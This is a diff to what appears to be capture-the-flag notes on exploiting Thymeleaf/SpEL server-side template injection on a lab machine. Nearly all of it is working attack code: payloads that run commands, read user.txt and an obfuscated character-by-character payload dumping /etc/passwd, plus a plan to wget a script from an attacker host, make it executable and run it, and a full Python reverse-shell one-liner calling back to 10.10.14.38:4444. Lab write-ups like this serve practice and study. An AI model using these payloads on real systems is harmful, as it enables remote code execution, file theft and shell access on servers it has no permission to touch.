@@ -117,3 +117,26 @@ Template engine: Thymeleaf
 Exploit: `name=*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}`
 
 Get user.txt: `name=*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat ../../../../../../home/woodenk/user.txt").getInputStream()).next()}`
+Dump with any charachter and with any size (in this case dump (/etc/passwd): `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`
+
+https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md
+
+
+The plan is:
+1. Upload a revshell
+	1.1. Setup a HTTP Server: python3 -m http.server
+	1.2. Recover the revshell: `name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.38:8000/rev.sh").getInputStream())}`
+2. Make it executable: `name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("chmod 777 rev.sh").getInputStream())}`
+3. Run it: `name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("./rev.sh").getInputStream())}`
+
+### Revshell file
+```bash
+
+#!/bin/bash
+
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+```
+
+### Interesting files
+/opt/
